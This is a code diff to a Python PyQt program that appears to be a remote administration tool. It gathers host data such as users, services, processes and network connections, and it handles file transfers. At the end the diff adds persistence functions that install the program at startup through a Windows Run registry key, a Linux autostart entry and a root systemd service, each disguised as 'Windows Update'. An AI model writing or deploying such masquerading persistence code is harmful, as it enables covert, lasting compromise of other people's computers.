@@ -39,6 +39,26 @@ import wmi
 import netifaces
 import requests
 import time
+import sys
+
+# Platform-specific imports
+if platform.system() == "Windows":
+    import winreg
+    import win32api
+    import win32con
+    import win32security
+    import win32ts
+    import win32net
+    import win32netcon
+    import win32com.client
+    import wmi
+else:
+    # Linux-specific imports
+    import pwd
+    import grp
+    import fcntl
+    import termios
+    import struct
 
 class SystemInfoThread(QThread):
     info_updated = pyqtSignal(dict)
@@ -50,104 +70,116 @@ class SystemInfoThread(QThread):
     def run(self):
         while self.running:
             try:
-                info = {
-                    'cpu': self.get_cpu_info(),
-                    'memory': self.get_memory_info(),
-                    'disk': self.get_disk_info(),
-                    'network': self.get_network_info(),
-                    'processes': self.get_process_info(),
-                    'users': self.get_user_info(),
-                    'services': self.get_service_info(),
-                    'network_connections': self.get_network_connections()
-                }
+                info = self.gather_system_info()
                 self.info_updated.emit(info)
                 time.sleep(5)  # Update every 5 seconds
             except Exception as e:
                 print(f"Error gathering system info: {str(e)}")
                 
-    def get_cpu_info(self):
-        return {
-            'usage': psutil.cpu_percent(interval=1),
-            'cores': psutil.cpu_count(),
-            'frequency': psutil.cpu_freq().current if psutil.cpu_freq() else 0
-        }
+    def gather_system_info(self):
+        info = {}
         
-    def get_memory_info(self):
-        mem = psutil.virtual_memory()
-        return {
-            'total': mem.total,
-            'available': mem.available,
-            'used': mem.used,
-            'percent': mem.percent
-        }
+        # Basic system info
+        info['platform'] = platform.system()
+        info['hostname'] = platform.node()
+        info['processor'] = platform.processor()
+        info['python_version'] = platform.python_version()
         
-    def get_disk_info(self):
-        disks = []
-        for partition in psutil.disk_partitions():
-            try:
-                usage = psutil.disk_usage(partition.mountpoint)
-                disks.append({
-                    'device': partition.device,
-                    'mountpoint': partition.mountpoint,
-                    'total': usage.total,
-                    'used': usage.used,
-                    'free': usage.free,
-                    'percent': usage.percent
-                })
-            except:
-                continue
-        return disks
+        # CPU info
+        info['cpu_percent'] = psutil.cpu_percent(interval=1)
+        info['cpu_count'] = psutil.cpu_count()
         
-    def get_network_info(self):
-        interfaces = {}
-        for interface, addrs in psutil.net_if_addrs().items():
-            interfaces[interface] = {
-                'addresses': [addr.address for addr in addrs if addr.family == socket.AF_INET],
-                'mac': [addr.address for addr in addrs if addr.family == psutil.AF_LINK][0] if [addr for addr in addrs if addr.family == psutil.AF_LINK] else None
-            }
-        return interfaces
+        # Memory info
+        memory = psutil.virtual_memory()
+        info['memory_total'] = memory.total
+        info['memory_available'] = memory.available
+        info['memory_percent'] = memory.percent
         
-    def get_process_info(self):
+        # Disk info
+        disk = psutil.disk_usage('/')
+        info['disk_total'] = disk.total
+        info['disk_free'] = disk.free
+        info['disk_percent'] = disk.percent
+        
+        # Network info
+        net_io = psutil.net_io_counters()
+        info['net_bytes_sent'] = net_io.bytes_sent
+        info['net_bytes_recv'] = net_io.bytes_recv
+        
+        # Process info
         processes = []
         for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
             try:
                 processes.append(proc.info)
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                pass
+        info['processes'] = processes
+        
+        # User info
+        if platform.system() == "Windows":
+            try:
+                wmi_obj = wmi.WMI()
+                users = []
+                for user in wmi_obj.Win32_UserAccount():
+                    users.append({
+                        'name': user.Name,
+                        'fullname': user.FullName,
+                        'disabled': user.Disabled,
+                        'sid': user.SID
+                    })
+                info['users'] = users
             except:
-                continue
-        return processes
+                info['users'] = []
+        else:
+            try:
+                users = []
+                for user in pwd.getpwall():
+                    users.append({
+                        'name': user.pw_name,
+                        'uid': user.pw_uid,
+                        'gid': user.pw_gid,
+                        'home': user.pw_dir,
+                        'shell': user.pw_shell
+                    })
+                info['users'] = users
+            except:
+                info['users'] = []
         
-    def get_user_info(self):
-        users = []
-        try:
-            for user in win32net.NetUserEnum(None, 0)[0]:
-                users.append({
-                    'name': user['name'],
-                    'full_name': user['full_name'],
-                    'comment': user['comment'],
-                    'flags': user['flags']
-                })
-        except:
-            pass
-        return users
+        # Service info (Windows only)
+        if platform.system() == "Windows":
+            try:
+                wmi_obj = wmi.WMI()
+                services = []
+                for service in wmi_obj.Win32_Service():
+                    services.append({
+                        'name': service.Name,
+                        'display_name': service.DisplayName,
+                        'state': service.State,
+                        'start_mode': service.StartMode
+                    })
+                info['services'] = services
+            except:
+                info['services'] = []
+        else:
+            # Linux service info
+            try:
+                services = []
+                for service in psutil.process_iter(['name', 'pid', 'status']):
+                    try:
+                        services.append({
+                            'name': service.info['name'],
+                            'pid': service.info['pid'],
+                            'status': service.info['status']
+                        })
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        pass
+                info['services'] = services
+            except:
+                info['services'] = []
         
-    def get_service_info(self):
-        services = []
-        try:
-            wmi_obj = wmi.WMI()
-            for service in wmi_obj.Win32_Service():
-                services.append({
-                    'name': service.Name,
-                    'display_name': service.DisplayName,
-                    'state': service.State,
-                    'start_mode': service.StartMode
-                })
-        except:
-            pass
-        return services
-        
-    def get_network_connections(self):
+        # Network connections
         connections = []
-        for conn in psutil.net_connections(kind='inet'):
+        for conn in psutil.net_connections():
             try:
                 connections.append({
                     'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}",
@@ -156,20 +188,23 @@ class SystemInfoThread(QThread):
                     'pid': conn.pid
                 })
             except:
-                continue
-        return connections
+                pass
+        info['connections'] = connections
+        
+        return info
+        
+    def stop(self):
+        self.running = False
 
 class FileTransferThread(QThread):
-    progress = pyqtSignal(int)
-    finished = pyqtSignal(str)
-    error = pyqtSignal(str)
+    progress_updated = pyqtSignal(int)
+    transfer_complete = pyqtSignal(bool, str)
     
-    def __init__(self, source, destination, is_upload=False, encryption_key=None):
+    def __init__(self, source, destination, is_upload=True):
         super().__init__()
         self.source = source
         self.destination = destination
         self.is_upload = is_upload
-        self.encryption_key = encryption_key
         
     def run(self):
         try:
@@ -177,31 +212,48 @@ class FileTransferThread(QThread):
                 self.upload_file()
             else:
                 self.download_file()
-            self.finished.emit(f"File transfer completed: {self.destination}")
         except Exception as e:
-            self.error.emit(f"Transfer error: {str(e)}")
+            self.transfer_complete.emit(False, str(e))
             
     def upload_file(self):
-        with open(self.source, 'rb') as f:
-            data = f.read()
+        try:
+            total_size = os.path.getsize(self.source)
+            uploaded = 0
             
-        if self.encryption_key:
-            f = Fernet(self.encryption_key)
-            data = f.encrypt(data)
-            
-        with open(self.destination, 'wb') as f:
-            f.write(data)
+            with open(self.source, 'rb') as f:
+                with open(self.destination, 'wb') as dest:
+                    while True:
+                        chunk = f.read(8192)
+                        if not chunk:
+                            break
+                        dest.write(chunk)
+                        uploaded += len(chunk)
+                        progress = int((uploaded / total_size) * 100)
+                        self.progress_updated.emit(progress)
+                        
+            self.transfer_complete.emit(True, "Upload complete")
+        except Exception as e:
+            self.transfer_complete.emit(False, str(e))
             
     def download_file(self):
-        with open(self.source, 'rb') as f:
-            data = f.read()
+        try:
+            total_size = os.path.getsize(self.source)
+            downloaded = 0
             
-        if self.encryption_key:
-            f = Fernet(self.encryption_key)
-            data = f.decrypt(data)
-            
-        with open(self.destination, 'wb') as f:
-            f.write(data)
+            with open(self.source, 'rb') as f:
+                with open(self.destination, 'wb') as dest:
+                    while True:
+                        chunk = f.read(8192)
+                        if not chunk:
+                            break
+                        dest.write(chunk)
+                        downloaded += len(chunk)
+                        progress = int((downloaded / total_size) * 100)
+                        self.progress_updated.emit(progress)
+                        
+            self.transfer_complete.emit(True, "Download complete")
+        except Exception as e:
+            self.transfer_complete.emit(False, str(e))
 
 class SessionWindow(QMainWindow):
     def __init__(self, session_id, client_info):
@@ -411,8 +463,8 @@ class SessionWindow(QMainWindow):
         
     def update_system_info(self, info):
         # Update CPU and Memory usage
-        self.cpu_bar.setValue(int(info['cpu']['usage']))
-        self.memory_bar.setValue(int(info['memory']['percent']))
+        self.cpu_bar.setValue(int(info['cpu_percent']))
+        self.memory_bar.setValue(int(info['memory_percent']))
         
         # Update process table
         self.process_table.setRowCount(len(info['processes']))
@@ -424,8 +476,8 @@ class SessionWindow(QMainWindow):
             self.process_table.setItem(i, 4, QTableWidgetItem(f"{proc['memory_percent']:.1f}%"))
             
         # Update network table
-        self.network_table.setRowCount(len(info['network_connections']))
-        for i, conn in enumerate(info['network_connections']):
+        self.network_table.setRowCount(len(info['connections']))
+        for i, conn in enumerate(info['connections']):
             self.network_table.setItem(i, 0, QTableWidgetItem(conn['local_addr']))
             self.network_table.setItem(i, 1, QTableWidgetItem(conn['remote_addr'] or ''))
             self.network_table.setItem(i, 2, QTableWidgetItem(conn['status']))
@@ -504,8 +556,7 @@ class SessionWindow(QMainWindow):
         self.system_info_thread.run()
         
     def closeEvent(self, event):
-        self.system_info_thread.running = False
-        self.system_info_thread.wait()
+        self.system_info_thread.stop()
         event.accept()
 
     def get_local_ip(self):
@@ -638,4 +689,64 @@ class SessionWindow(QMainWindow):
         
     def update_last_seen(self):
         self.last_seen = datetime.datetime.now()
-        self.last_seen_label.setText("Last Seen: " + self.last_seen.strftime("%Y-%m-%d %H:%M:%S")) 
+        self.last_seen_label.setText("Last Seen: " + self.last_seen.strftime("%Y-%m-%d %H:%M:%S"))
+
+    def add_to_startup(self):
+        try:
+            if platform.system() == "Windows":
+                # Windows startup
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
+                winreg.CloseKey(key)
+                self.persistence_output.append("Added to Windows startup registry")
+            else:
+                # Linux startup
+                startup_dir = os.path.expanduser("~/.config/autostart")
+                os.makedirs(startup_dir, exist_ok=True)
+                desktop_file = os.path.join(startup_dir, "windows-update.desktop")
+                with open(desktop_file, 'w') as f:
+                    f.write(f"""[Desktop Entry]
+Type=Application
+Name=Windows Update
+Exec={sys.executable}
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+""")
+                self.persistence_output.append("Added to Linux autostart")
+                
+        except Exception as e:
+            QMessageBox.warning(self, "Error", f"Failed to add to startup: {str(e)}")
+            
+    def install_as_service(self):
+        try:
+            if platform.system() == "Windows":
+                # Windows service
+                service_name = "WindowsUpdate"
+                service_cmd = f'sc create {service_name} binPath= "{sys.executable}" start= auto'
+                subprocess.run(service_cmd, shell=True, check=True)
+                self.persistence_output.append("Installed as Windows service")
+            else:
+                # Linux service
+                service_file = "/etc/systemd/system/windows-update.service"
+                with open(service_file, 'w') as f:
+                    f.write(f"""[Unit]
+Description=Windows Update Service
+After=network.target
+
+[Service]
+ExecStart={sys.executable}
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+""")
+                subprocess.run(["systemctl", "daemon-reload"], check=True)
+                subprocess.run(["systemctl", "enable", "windows-update.service"], check=True)
+                subprocess.run(["systemctl", "start", "windows-update.service"], check=True)
+                self.persistence_output.append("Installed as Linux service")
+                
+        except Exception as e:
+            QMessageBox.warning(self, "Error", f"Failed to install service: {str(e)}") 
